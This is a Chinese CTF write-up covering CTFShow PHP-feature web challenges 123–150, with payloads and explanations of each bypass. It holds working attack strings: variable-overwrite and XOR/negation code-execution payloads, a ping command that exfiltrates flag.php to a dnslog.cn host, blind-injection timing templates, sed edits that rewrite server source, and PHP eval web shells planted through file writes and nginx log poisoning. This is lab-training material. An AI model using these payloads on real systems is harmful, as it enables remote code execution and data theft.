# PHP特性（123-150）
## 123
![image copy 10.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272105766_image_copy_10.png)
`CTF_SHOW=1&CTF[SHOW.COM=2&fun=echo $flag`
突破到eval时就可以拿到flag了
## 125
![image copy 11.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272107370_image_copy_11.png)
`CTF_SHOW=1&CTF[SHOW.COM=2&fun=extract($_POST)&fl0g=flag_give_me`
 
`$c=$_POST['fun'];`，所以我们让` fun=extract($_POST)`
检查正则：`preg_match("/.../i", $c)`，我们的 `extract($_POST)` 里没有被禁止的关键词（flag、echo 等），且长度 <=16，可以通过。
执行 `eval("$c;")`
`eval("extract($_POST);");` 执行后，$_POST 里的所有参数都会被注册为变量。
执行 `extract($_POST)` 后，就会自动创建 `$fl0g = "flag_give_me"`


## 126
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1781922747759_image.png)

POST 参数 `CTF_SHOW.COM` 含点号：PHP 会将 POST 变量名中的 `.` 转为 `_`，所以直接传 `CTF_SHOW.COM` 会被转成 `CTF_SHOW_COM`。利用 PHP 的 `[` 转 `_` 机制——`CTF[SHOW.COM` 会被转为 `CTF_SHOW.COM`，后面的 `.` 得以保留。

``!isset($_GET['fl0g'])`` 禁止 GET 传 `fl0g`：但最终 `$fl0g` 必须等于 `flag_give_me` 才能输出 flag。利用 `$_SERVER['argv']` 接收 `query string 查询字符`，通过 `parse_str($a[1])` 在 `eval` 作用域内完成变量覆盖——把`fl0g` 参数藏在 `a[1]` 数组里。

`$c` 不能包含 `g、i、f、c、o、d、flag、echo、print、var_dump、GLOBALS` 等大量字符，且长度 ≤ 16。`parse_str($a[1])` 恰好 16 个字符，不含任何被过滤的字符。

变量覆盖：`parse_str($a[1])` 将`a[1]`中的`fl0g=flag_give_me` **解析为变量**，满足 `$fl0g === "flag_give_me"` 条件。

注意：`$_SERVER['argv'] `会把整个 `query string` 按空格切分成数组。 
所以 URL 传的是 `?a=1+fl0g=flag_give_me`，按空格（`+`）切开后：
`$a[0] = 1`
`$a[1] = fl0g=flag_give_me`


GET:`?a=1+fl0g=flag_give_me`
POST:`CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])`


## 127
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1781924612479_image.png)
直接尝试变量覆盖
?ctf_show=ilove36d  下划线被过滤了，加号是空格，但是加号也被过滤了，点也被过滤了。
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1781925249210_image.png)
空格没有被过滤
`?ctf show=ilove36d`

## 128
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783555348429_image.png)
[call_user_func](https://www.php.net/manual/zh/function.call-user-func.php):第一个参数是被调用的回调函数，其余参数是回调函数的参数。

f1是无数字无大小写字母，f2可控
有一个特殊函数 [gettext](https://www.php.net/manual/zh/function.gettext.php) 可以被`_`调用，这个函数可以输出一个字符串。
f2：可以先用phpinfo来判断能不能继续re，[get_defined_vars](https://www.php.net/manual/zh/function.get-defined-vars.php) 可以泄露变量


## 129 目录穿越
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783556029823_image.png)
[stripos](https://www.php.net/manual/zh/function.stripos.php):第二个字符串在第一个字符串首次出现的位置。stripos不区分大小写，strpos区分大小写
`/var/www/html/`默认目录。
f=`/ctfshow/../../var/www/html/flag.php `

也可以直接 `php://filter/read=convert.base64-encode/resource=ctfshow/../flag.php`


## 130
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783557591858_image.png)

```
if(preg_match('/.+?ctfshow/is', $f)){       /i是匹配大小写，s是匹配换行  这里的正则 前面至少有一个问号，没有问号直接过
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){   /stripos返回的是int型   === 全等不转换类型，int不全等bool型
        die('bye!!');
    }

```
## 131
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783558578878_image.png)
这一题要使用正则溢出来绕过第一个。也就是说正则匹配超过一定字符数就会自动返回0（false）
字符串长度大于 **[100014](https://www.laruence.com/2010/06/08/1579.html)** 的时候, 就不会得出正确结果
```
<?php
echo str_repeat('very', '250000').'36Dctfshow';
```
pyload就是 复制结果

## 132
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783561954676_image.png)
先是进一个页面，去看/robots.txt能找到 /admin
第一层存在username code password
第二层 `||`满足后面的username=admin就行（或：一个为真就为真）
第三层 code=admin
pyload:`?username=admin&code=admin&password=1;`

## 133

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783564626435_image.png)

?F=`$F`; ping`cat flag.php|grep ctfshow | tr -cd "[a-z]"/"[0-9]"`.4fy7r6.dnslog.cn -c 1
前六个字符刚好是``` `$F`;空格  ```  截取之后就变为``` eval('`$F`; ');```  在 PHP 里，反引号是执行 shell 命令，类似：`shell_exec($F);` 关键这里：`$F` 在 `eval` 的作用域里仍然是原始完整 GET 参数
``` `$F`; ping`cat flag.php|grep ctfshow | tr -cd "[a-z]"/"[0-9]"`.4fy7r6.dnslog.cn -c 1```

只是一次命令替换。通常 shell 环境变量 F 为空，所以它基本不产生有效输出；后面的 ; 结束这一段。接着 shell 继续执行：``ping `cat flag.php | grep ctfshow | tr -cd "[a-z]"/"[0-9]"`.4fy7r6.dnslog.cn -c 1``

http://www.dnslog.cn/   可以获得一个测试域名，二级域名有限制需要对`cat flag.php`的结果进行修改
`grep ctfshow`对cat输出的内容，找到含有ctfshow的哪一行，`tr -cd"[a-z]"/"0-9"`tr是字符转换删除工具，-c表示取反（除了指定字符以外的字符）-d表示删除  `删除所有不是小写字母、数字等指定集合里的字符`完了之后拼接，ping触发DNS查询，DNS 平台就能看到这个子域名，从而带出结果
8-4-4-4-12
ctfshow{1f1e2060-0e05-44ac-9491-b89f4dc3b1a9}

## 134
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783591860132_image.png)
这题将GET和POST传入key1key2给禁用了
payload:`?_POST[key1]=36d&_POST[key2]=36d`
一开始 PHP 看到的是：
```
$_GET = [
    "_POST" => [
        "key1" => "36d",
        "key2" => "36d"
    ]
];

$_POST = [];
```
所以：
```
isset($_GET['key1'])   // false
isset($_GET['key2'])   // false
isset($_POST['key1'])  // false
isset($_POST['key2'])  // false
```
检查绕过去了。
然后关键来了：

`@parse_str($_SERVER['QUERY_STRING']);`
`$_SERVER['QUERY_STRING'] `就是 URL 问号后面的原始字符串:`_POST[key1]=36d&_POST[key2]=36d`
`parse_str` 会把这段`字符串`解析成`变量`。
所以它相当于执行了：
```
$_POST = [
    "key1" => "36d",
    "key2" => "36d"
];
```
前面的 @ 只是抑制报错/警告，不影响逻辑。
接着：
`extract($_POST);`
`extract` 的作用是:把`数组`的`键名`变成`变量名`。
比如：
```
$_POST = [
    "key1" => "36d",
    "key2" => "36d"
];
```
执行：
`extract($_POST);`
等价于：
`$key1 = "36d";  $key2 = "36d";`

而且 `extract` 默认会覆盖已有变量，所以原来的：
`$key1 = 0;
$key2 = 0;`
被覆盖成了：
`$key1 = "36d";
$key2 = "36d";`
最后判断成功：
```
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```

这题利用的是 `parse_str` 造成的变量覆盖，再配合 `extract($_POST)` 把 `$_POST['key1']、$_POST['key2']` 变成 $key1、$key2。典型的 PHP 变量污染。

## 135

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783653159730_image.png)
发现一个骚操作可以不用ping把数据带出来。如下：
1.自身的值在被eval时候直接引用自身，可以用cp把flag复制到1.txt访问 ``?F=`$F`+;cp+flag.php+1.txt``

2.可以使用tar打包flag.php文件，然后访问下载 payload： ``?F=`$F`+;tar -czvf 1.tar.gz flag.php`` 访问/1.tar.gz下载，解压即可

## 136
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783655341285_image.png)

1.一个正则过滤，一个无回显的命令执行
使用`tee`命令，可以变为另一个文件，类似`>`

`?c=ls /|tee 1` 访问1下载查看， `?c=cat /f149_15_h3r3|tee 2 `访问下载查看文件2


2.还有一个更骚的操作
``ls | xargs sed -i 's/die/echo/'``和``ls | xargs sed -i 's/exec/system/'``
```
ls：列出当前目录文件
|：把前一个命令的结果传给后一个命令
xargs：把文件名拼到后面的命令里
sed -i 's/die/echo/'：直接在文件里把 die 替换成 echo
```
如果存在命令执行，且 sed -i 可用、源码可写、过滤没拦关键字符，那就很可能能“改题目源码”

----
`sed` 可以理解成一个“命令行文本编辑器”。它最常见的用途就是：**查找、替换、删除、打印文本**。

基本格式：

```bash
sed [选项] '操作命令' 文件名
```

最经典的是替换：

```bash
sed 's/旧内容/新内容/' file.txt
```

这里的 `s` 是 substitute，替换的意思。

比如：

`sed 's/apple/banana/' a.txt`

意思是：把每一行里第一次出现的 `apple` 替换成 `banana`，然后把结果输出到屏幕。

注意：默认不会修改原文件。

如果想直接改文件，要加 `-i`：

`sed -i 's/apple/banana/' a.txt`这就是能“改题目”的关键：

`sed -i 's/die/echo/' index.php`
意思是：直接在 `index.php` 里，把第一次匹配到的 `die` 替换成 `echo`。

如果想一行里所有匹配都替换，加 `g`：`sed -i 's/apple/banana/g' a.txt`
。`g` 是 global，表示全局替换。


还可以换分隔符。比如路径里很多 `/`，这样写很烦：

`sed -i 's/\/var\/www\/html/\/tmp/g' a.txt`

可以改成：

`sed -i 's#/var/www/html#/tmp#g' a.txt`

`sed` 不强制用 `/` 当分隔符，`#`、`@` 都可以。

----

几个常见用法：

`sed -n '1,5p' a.txt`只打印第 1 到第 5 行。这里 `-n` 表示不要默认输出，`p` 表示 print。

`sed '3d' a.txt`删除第 3 行后输出结果。

`sed '/password/d' a.txt`删除包含 `password` 的行。

`sed -i.bak 's/old/new/g' a.txt`原地修改，同时生成备份文件 `a.txt.bak`。

----

`ls | xargs sed -i 's/exec/system/'`拆开就是：

`ls`列出当前目录文件。

`xargs`把前面的文件名拼到后面的命令后面。

最终变成：

`sed -i 's/exec/system/' index.php`

也就是直接修改 PHP 源码。

所以在 CTF 命令执行题里，`sed` 很危险的原因是：它不是单纯查看文件，而是能用 `-i` **原地改服务器上的文件内容**。只要 Web 进程有写权限，过滤又没拦住它，就可能修改题目逻辑。



## 137
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783660917916_image.png)

两个类，魔术类静态类

[call_user_func](https://www.php.net/manual/zh/function.call-user-func.php)
是 PHP 里的“动态调用函数”

基本格式是：call_user_func(要调用的函数或方法, 参数1, 参数2, ...)

支持几种常见调用方式：
`call_user_func("phpinfo");`
调用普通函数：
`phpinfo();`

调用类的静态方法：
`call_user_func("类名::方法名");`
例如
`call_user_func("ctfshow::getFlag");`

------
`__wakeup() `是反序列化魔术方法，通常在：
`unserialize($data);`
时自动触发。



-------

POST:ctfshow=ctfshow::getFlag


## 138
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783822673030_image.png)
`strripos`以不区分大小写的方式查找指定字符串在目标字符串中最后一次出现的位置。
与 `strrpos() `不同，`strripos() `不区分大小写,`strrpos()`区分大小写

也就是说`:`被禁用了

call-user-func还支持数组形式的请求

```
在 PHP 里，数组形式的 请求 有两种常见写法：
[$object, 'methodName']     // 调用对象方法
['ClassName', 'methodName'] // 调用静态方法
```

payload：`ctfshow[0]=ctfshow&ctfshow[1]=getFlag`数组形式调用静态方法 



## 139
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783824304169_image.png)
与136很像，这一题需要命令盲注
[脚本](\139.py)


```if [ `ls / -1 |cut -c {} | awk \"NR=={}\"`  ==  \"{}\" ];then sleep 4;fi```
```if [ `cat /f149_15_h3r3 |cut -c {} `  ==  \"{}\" ];then sleep 4;fi```

其中`ls / -1`将根目录竖列排出，`cut -c ` 截取指定字符 ``awk "NR=={}"``读取的列数（行号）
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784013055971_image.png)


## 140
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784013598313_image.png)

`f1=system&f2=system`

`f1=getdate&f2=getdate`

`f1=usleep&f2=usleep`

都可以。弱比较，左边是数字，右边的非数字会被转换为数字0

主要目的就是让`intval（$code）`=0
`PHP 8 改了这类弱比较规则，0 == 'ctfshow' 不再成立`

## 141
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784069699645_image.png)
`^\w+$`表示在开头和末尾匹配字母数字_，传入的v3值不能有字母数字_，即无字母的命令执行

绕过return 应该说运算符都可以绕过 。只是把 payload 和前后的 1 连成一个合法表达式，让 PHP 在 return 前必须先计算它。
`?
v1=1&v2=1&v3=-("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")('%03%01%08%01%06%01'^'%60%60%7C%21%60%2B');`

## 142
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784072456693_image.png)

V1=0


## 143
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784073275904_image.png)
过滤了取反,+,-等符号，还可以用 或 异或 等运算 加上 *

`?v1=1&v2=2&v3=%2A%28%28%27%29%3E%21%3A%3D%29%2C%3E%27%5E%27%5B%5B%40%5E%5B%40%40%5B%27%29%28%27%3D%2C%21%3A%20%60%28%60%27%5E%27%5B%40%40%5D%0E%10%40%10%27%29%29%2A`
=》`readfile("flag.php")`

## 144
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784164927652_image.png)
`V3=-`就行

`?v1=1&v3=-&v2=(~'%8C%86%8C%8B%9A%92')(~'%93%8C');`
找到`flag.php index.php`

`?v1=1&v3=-&v2=(~'%8C%86%8C%8B%9A%92')(~'%9C%9E%8B%DF%99%D5');`

##145
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784166729255_image.png)
过滤了更多的运算符。`|` `:` 没有被过滤。
`?v1=1&v2=2&v3=|(~'%8C%86%8C%8B%9A%92')(~'%93%8C')|`
`?v1=1&v2=2&v3=|(~'%8C%86%8C%8B%9A%92')(~'%9C%9E%8B%DF%99%D5')|`

## 146
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784167536342_image.png)

多过滤了`:`，`|`没有被过滤。

`?v1=1&v2=2&v3=|(~'%8C%86%8C%8B%9A%92')(~'%93%8C')|`
`?v1=1&v2=2&v3=|(~'%8C%86%8C%8B%9A%92')(~'%9C%9E%8B%DF%99%D5')|`

## 146
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784167842746_image.png)



```
/^[a-z0-9_]*$/isD
正则有 ^...$ 限制整体，从头到尾必须全都是[a-z0-9_]

^              从开头开始
[a-z0-9_]*     只能是字母、数字、下划线，出现 0 次或多次
$              到结尾
/i             不区分大小写，所以 A-Z 也算
/s             让 . 匹配换行，这里没用到 .
D              $ 必须严格匹配字符串结尾

```
?show=}system('cat flag.php');//
ctf=\create_function


## 147
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784677054410_image.png)






## 148
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784679851644_image.png)

1.GET: `?ctf=index.php`  POST:`show=<?php eval($_POST[1]);?>`
2.POST: 1=system("ls /")

## 149

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784682057630_image.png)
扫描当前目录，除了index其他的都删掉。然后再写，写完之后又在判断。

我们把index覆盖掉
GET：`?ctf=index.PHP`
show=`<?php eval(&_POST[1]);?>`   只有一次机会

刷新后，POST：`1=system('ls /');`发现flag,cat 就行


## 150
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784855869868_image.png)
日志文件包含 “/var/log/nginx/access.log”

显示在`user-Agent` 中写入 `<?php eval($_POST[1]);?>` 不要写错只要有一次机会

GET：isVIP=ture

POST：`ctf=/var/log/nginx/access.log&1=phpinfo();`尝试可以包含

接下来：`1=system("ls");`以及`1=system("cat flag.php");`

## 150-Plus
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784857062346_image.png)
包含条件更加严格，伪协议用不了，日志也不行了

当进行一个类判断的时候(`class_exists`) 就自动调用`__autoload`
GET:`?..CTFSHOW..=phpinfo`  phpinfo里有flag

----








